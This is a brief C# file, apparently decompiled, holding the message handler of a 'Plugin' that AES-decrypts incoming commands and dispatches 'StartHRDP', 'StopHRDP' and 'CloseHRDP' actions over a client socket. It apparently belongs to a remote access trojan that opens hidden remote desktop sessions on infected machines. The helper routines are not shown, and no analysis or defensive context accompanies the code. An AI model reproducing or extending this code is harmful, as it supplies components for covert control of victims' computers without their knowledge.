using System;
using System.Diagnostics;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Plugin
{
	// Token: 0x0200000B RID: 11
	public class Messages
	{
		// Token: 0x0600001E RID: 30 RVA: 0x00002920 File Offset: 0x00000B20
		public static void Read(byte[] b)
		{
			try
			{
				string[] array = Strings.Split(Helper.BS(Helper.AES_Decryptor(b)), Settings.SPL, -1, CompareMethod.Binary);
				string left = array[0];
				if (Operators.CompareString(left, "CloseHRDP", false) != 0)
				{
					if (Operators.CompareString(left, "StartHRDP", false) != 0)
					{
						if (Operators.CompareString(left, "StopHRDP", false) == 0)
						{
							bool flag = Helper.MyProcess != null;
							if (flag)
							{
								Helper.MyProcess.Kill();
								Helper.MyProcess = null;
								Helper.SendMsg("HRDP Stopped");
							}
						}
					}
					else
					{
						Helper.HRDPFunc(array[1], array[2]);
					}
				}
				else
				{
					ClientSocket.isDisconnected();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}
	}
}
